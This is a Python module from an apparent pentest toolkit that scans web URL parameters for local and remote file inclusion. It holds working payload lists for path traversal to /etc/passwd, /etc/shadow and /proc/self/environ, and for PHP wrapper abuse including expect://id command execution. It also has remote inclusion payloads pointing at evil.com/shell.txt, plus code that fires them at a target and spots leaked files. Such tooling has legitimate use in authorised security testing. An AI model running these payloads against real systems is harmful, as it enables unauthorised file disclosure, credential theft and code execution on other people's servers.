"""Local File Inclusion / Remote File Inclusion vulnerability scanner.

Tests URL parameters for LFI and RFI vulnerabilities using path traversal
sequences, null byte injection, wrapper abuse, and remote inclusion payloads.
"""

import asyncio
import re
from typing import Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import aiohttp

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

# ── LFI: Path traversal payloads ──────────────────────────────────────────────

LFI_UNIX_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # Encoded traversal
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # Null byte injection (legacy PHP < 5.3.4)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    "../../../etc/passwd%00.html",
    "../../../etc/passwd%00.php",
    # Path truncation
    "../../../etc/passwd.............................",
    "../../../etc/passwd" + "/" * 200,
    # Backslash variants
    "..\\..\\..\\..\\etc\\passwd",
    "....//....//....//....//etc/passwd",
    # Absolute path
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hostname",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
]

LFI_WINDOWS_PAYLOADS = [
    # Basic traversal
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
    "../../../windows/system.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../windows/system32/drivers/etc/hosts",
    # Encoded
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
    # Absolute
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
    "C:\\windows\\system.ini",
    "C:\\boot.ini",
]

# ── LFI: PHP wrapper payloads ─────────────────────────────────────────────────

PHP_WRAPPER_PAYLOADS = [
    # php://filter - read source code as base64
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config",
    "php://filter/convert.base64-encode/resource=../config",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
    # php://input (requires POST body)
    "php://input",
    # data:// wrapper
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",  # <?php phpinfo();?>
    "data://text/plain,<?php phpinfo();?>",
    # expect:// wrapper
    "expect://id",
    "expect://whoami",
    # zip:// and phar:// (require file upload)
    "phar://uploaded.phar/test.txt",
]

# ── RFI: Remote file inclusion payloads ───────────────────────────────────────

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://evil.com/shell.txt",
    "http://evil.com/shell.txt%00",
    "//evil.com/shell.txt",
    "http://evil.com/shell.txt?",
    "http://evil.com/shell.txt#",
    # Common RFI test files
    "http://pastebin.com/raw/test",
    "https://raw.githubusercontent.com/test/test/main/test.txt",
    # FTP
    "ftp://evil.com/shell.txt",
]

# ── Response fingerprints indicating successful LFI ───────────────────────────

LFI_SUCCESS_PATTERNS: dict[str, list[tuple[str, str]]] = {
    "unix_passwd": [
        (r"root:.*?:0:0:", "LFI confirmed: /etc/passwd content exposed"),
        (r"daemon:.*?:/usr/sbin", "LFI confirmed: /etc/passwd content exposed"),
        (r"nobody:.*?:/nonexistent", "LFI confirmed: /etc/passwd content exposed"),
        (r"www-data:.*?:/var/www", "LFI confirmed: /etc/passwd content exposed"),
    ],
    "unix_shadow": [
        (r"root:\$[0-9a-z]+\$", "Critical: /etc/shadow content exposed (password hashes)"),
    ],
    "unix_proc": [
        (r"DOCUMENT_ROOT=", "LFI confirmed: /proc/self/environ exposed"),
        (r"HTTP_HOST=", "LFI confirmed: /proc/self/environ exposed"),
        (r"Linux version \d", "LFI confirmed: /proc/version exposed"),
    ],
    "windows_ini": [
        (r"\[extensions\]", "LFI confirmed: win.ini content exposed"),
        (r"for 16-bit app support", "LFI confirmed: win.ini or system.ini exposed"),
        (r"\[boot loader\]", "LFI confirmed: boot.ini content exposed"),
    ],
    "windows_hosts": [
        (r"# Copyright.*Microsoft", "LFI confirmed: Windows hosts file exposed"),
    ],
    "php_info": [
        (r"phpinfo\(\)", "PHP code execution via file inclusion"),
        (r"PHP Version \d", "PHP code execution via file inclusion"),
        (r"<title>phpinfo\(\)</title>", "PHP code execution via file inclusion"),
    ],
    "php_source": [
        (r"<\?php", "PHP source code exposed via wrapper"),
        (r"<\?=", "PHP source code exposed via wrapper"),
    ],
    "base64_source": [
        (r"^[A-Za-z0-9+/]{50,}={0,2}$", "Base64 encoded content returned (php://filter success)"),
    ],
    "log_file": [
        (r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*?(GET|POST|HEAD)\s+/",
         "Log file inclusion detected (potential log poisoning vector)"),
    ],
}

# Patterns indicating the server is blocking LFI attempts
BLOCK_INDICATORS = [
    r"(directory traversal|path traversal|not allowed)",
    r"(forbidden|access denied|not permitted)",
    r"(mod_security|web application firewall|waf)",
    r"(invalid path|invalid file|illegal character)",
]


class LfiRfiScannerModule(AtsModule):
    """Test URL parameters for Local/Remote File Inclusion vulnerabilities."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="lfi_rfi_scanner",
            category=ModuleCategory.PENTEST,
            description="Test URL parameters for LFI and RFI vulnerabilities using path traversal, PHP wrappers, null bytes, and remote inclusion payloads",
            version="1.0.0",
            parameters=[
                Parameter(name="url", type=ParameterType.URL,
                          description="Target URL with parameters to test for file inclusion",
                          required=True),
                Parameter(name="parameters", type=ParameterType.STRING,
                          description="Comma-separated list of specific parameters to test (empty = all)",
                          required=False, default=""),
                Parameter(name="techniques", type=ParameterType.CHOICE,
                          description="File inclusion techniques to test",
                          choices=["all", "lfi_unix", "lfi_windows", "php_wrappers", "rfi"],
                          default="all"),
                Parameter(name="os_target", type=ParameterType.CHOICE,
                          description="Target operating system for payload selection",
                          choices=["auto", "unix", "windows", "both"],
                          default="auto"),
            ],
            outputs=[
                OutputField(name="vulnerabilities", type="list",
                            description="Detected file inclusion vulnerabilities with evidence"),
                OutputField(name="summary", type="dict",
                            description="Scan summary with statistics"),
            ],
            requires_api_key=False,
            api_key_service=None,
            tags=["pentest", "lfi", "rfi", "file-inclusion", "path-traversal", "web"],
            author="ATS-Toolkit",
            dangerous=True,
        )

    def validate_inputs(self, config: dict[str, Any]) -> tuple[bool, str]:
        url = config.get("url", "").strip()
        if not url:
            return False, "URL is required"
        if not url.startswith(("http://", "https://")):
            return False, "URL must start with http:// or https://"
        return True, ""

    def _extract_params(self, url: str, param_filter: str) -> list[str]:
        """Extract query parameters from URL, optionally filtering."""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        if param_filter:
            selected = [p.strip() for p in param_filter.split(",") if p.strip()]
            params = [p for p in params if p in selected]
        return params

    def _build_injected_url(self, url: str, param: str, payload: str) -> str:
        """Replace a query parameter value with the file inclusion payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _get_payloads(self, techniques: str, os_target: str) -> list[tuple[str, str]]:
        """Build list of (payload, technique_category) tuples."""
        payloads: list[tuple[str, str]] = []

        include_unix = os_target in ("auto", "unix", "both")
        include_windows = os_target in ("auto", "windows", "both")

        if techniques in ("all", "lfi_unix") and include_unix:
            payloads.extend([(p, "lfi_unix") for p in LFI_UNIX_PAYLOADS])

        if techniques in ("all", "lfi_windows") and include_windows:
            payloads.extend([(p, "lfi_windows") for p in LFI_WINDOWS_PAYLOADS])

        if techniques in ("all", "php_wrappers"):
            payloads.extend([(p, "php_wrapper") for p in PHP_WRAPPER_PAYLOADS])

        if techniques in ("all", "rfi"):
            payloads.extend([(p, "rfi") for p in RFI_PAYLOADS])

        return payloads

    def _check_success_patterns(self, body: str) -> list[dict[str, str]]:
        """Check response body for LFI/RFI success indicators."""
        matches: list[dict[str, str]] = []
        for category, patterns in LFI_SUCCESS_PATTERNS.items():
            for pattern, description in patterns:
                if re.search(pattern, body, re.IGNORECASE | re.MULTILINE):
                    matches.append({
                        "category": category,
                        "pattern": pattern,
                        "description": description,
                    })
                    break  # one match per category is enough
        return matches

    def _check_blocked(self, body: str, status: int) -> bool:
        """Check if the response indicates the payload was blocked."""
        if status == 403:
            return True
        for pattern in BLOCK_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                return True
        return False

    def _detect_os(self, headers: dict[str, str], body: str) -> str:
        """Try to detect the target OS from response headers."""
        server = headers.get("server", "").lower()
        if any(s in server for s in ("unix", "linux", "ubuntu", "debian", "centos")):
            return "unix"
        if any(s in server for s in ("win", "iis", "microsoft")):
            return "windows"
        powered_by = headers.get("x-powered-by", "").lower()
        if "php" in powered_by or "asp" in powered_by:
            if "win" in server or "iis" in server:
                return "windows"
            return "unix"
        return "auto"

    async def _get_baseline(self, session: aiohttp.ClientSession, url: str,
                             param: str) -> tuple[int, str, int, dict[str, str]]:
        """Get baseline response for comparison."""
        baseline_url = self._build_injected_url(url, param, "nonexistent_file_12345")
        try:
            async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=10),
                                   ssl=False, allow_redirects=True) as resp:
                body = await resp.text(errors="replace")
                headers = {k.lower(): v for k, v in resp.headers.items()}
                return resp.status, body, len(body), headers
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return 0, "", 0, {}

    async def _test_param(self, session: aiohttp.ClientSession, url: str, param: str,
                           payloads: list[tuple[str, str]],
                           baseline_status: int, baseline_len: int) -> list[dict[str, Any]]:
        """Test a single parameter with all payloads."""
        vulnerabilities: list[dict[str, Any]] = []

        for payload, category in payloads:
            injected_url = self._build_injected_url(url, param, payload)
            try:
                async with session.get(injected_url, timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text(errors="replace")
                    status = resp.status

                    # Skip if blocked
                    if self._check_blocked(body, status):
                        continue

                    # Check for LFI/RFI success patterns
                    success_matches = self._check_success_patterns(body)
                    if success_matches:
                        severity = "critical"
                        if any(m["category"] in ("unix_shadow",) for m in success_matches):
                            severity = "critical"
                        elif any(m["category"] in ("php_info",) for m in success_matches):
                            severity = "critical"
                        elif any(m["category"] in ("base64_source", "php_source")
                                 for m in success_matches):
                            severity = "high"
                        elif any(m["category"] == "log_file" for m in success_matches):
                            severity = "high"

                        vulnerabilities.append({
                            "type": category,
                            "parameter": param,
                            "payload": payload,
                            "status_code": status,
                            "response_length": len(body),
                            "evidence": success_matches,
                            "severity": severity,
                            "url": injected_url[:500],
                        })
                        continue

                    # Heuristic: significant response size difference for PHP wrappers
                    if category == "php_wrapper" and "base64-encode" in payload:
                        if (status == 200 and baseline_len > 0
                                and abs(len(body) - baseline_len) > 100):
                            # Check if response looks like base64
                            cleaned = body.strip()
                            if (len(cleaned) > 50
                                    and re.match(r'^[A-Za-z0-9+/\s]+=*$', cleaned)):
                                vulnerabilities.append({
                                    "type": "php_wrapper_base64",
                                    "parameter": param,
                                    "payload": payload,
                                    "status_code": status,
                                    "response_length": len(body),
                                    "evidence": [{
                                        "category": "base64_response",
                                        "description": "Response appears to be base64 encoded file content",
                                    }],
                                    "severity": "high",
                                    "url": injected_url[:500],
                                })

                    # Heuristic: error message disclosing path information
                    path_disclosure = re.search(
                        r'(failed to open stream|include\(\)|require\(\)|'
                        r'Warning.*?include|Warning.*?require|'
                        r'No such file|file_get_contents\(\)|'
                        r'fopen\(\)|readfile\(\))',
                        body, re.IGNORECASE,
                    )
                    if path_disclosure:
                        vulnerabilities.append({
                            "type": f"{category}_path_disclosure",
                            "parameter": param,
                            "payload": payload,
                            "status_code": status,
                            "evidence": [{
                                "category": "path_disclosure",
                                "pattern": path_disclosure.group(0)[:200],
                                "description": "Error message reveals file inclusion function - confirms parameter is used in file operations",
                            }],
                            "severity": "medium",
                            "url": injected_url[:500],
                        })

            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue

        return vulnerabilities

    async def execute(self, config: dict[str, Any]) -> dict[str, Any]:
        url = config["url"].strip()
        param_filter = config.get("parameters", "")
        techniques = config.get("techniques", "all")
        os_target = config.get("os_target", "auto")

        params = self._extract_params(url, param_filter)
        if not params:
            return {
                "vulnerabilities": [],
                "summary": {
                    "error": "No query parameters found in URL to test",
                    "url": url,
                    "total_tests": 0,
                    "vulnerabilities_found": 0,
                },
            }

        self.logger.info("lfi_rfi_scan_start", url=url, params=params, techniques=techniques)

        all_vulns: list[dict[str, Any]] = []
        connector = aiohttp.TCPConnector(limit=5, ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            for param in params:
                # Get baseline and detect OS
                baseline_status, baseline_body, baseline_len, baseline_headers = (
                    await self._get_baseline(session, url, param)
                )

                # Auto-detect OS if needed
                effective_os = os_target
                if os_target == "auto":
                    detected = self._detect_os(baseline_headers, baseline_body)
                    effective_os = detected if detected != "auto" else "both"

                payloads = self._get_payloads(techniques, effective_os)

                vulns = await self._test_param(
                    session, url, param, payloads,
                    baseline_status, baseline_len,
                )
                all_vulns.extend(vulns)

        # Deduplicate: keep highest severity per (param, type)
        best_vulns: dict[str, dict[str, Any]] = {}
        severity_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        for v in all_vulns:
            key = f"{v['parameter']}|{v['type']}"
            existing = best_vulns.get(key)
            if (not existing
                    or severity_rank.get(v["severity"], 0)
                    > severity_rank.get(existing["severity"], 0)):
                best_vulns[key] = v
        deduped = list(best_vulns.values())

        total_payloads = sum(
            len(self._get_payloads(techniques, os_target if os_target != "auto" else "both"))
            for _ in params
        )

        summary = {
            "url": url,
            "parameters_tested": params,
            "techniques_used": techniques,
            "os_target": os_target,
            "total_payloads_per_param": total_payloads // max(len(params), 1),
            "total_tests": total_payloads,
            "vulnerabilities_found": len(deduped),
            "severity_breakdown": {
                "critical": sum(1 for v in deduped if v.get("severity") == "critical"),
                "high": sum(1 for v in deduped if v.get("severity") == "high"),
                "medium": sum(1 for v in deduped if v.get("severity") == "medium"),
                "low": sum(1 for v in deduped if v.get("severity") == "low"),
            },
        }

        self.logger.info("lfi_rfi_scan_complete", vulns=len(deduped),
                         tests=total_payloads)
        return {"vulnerabilities": deduped, "summary": summary}
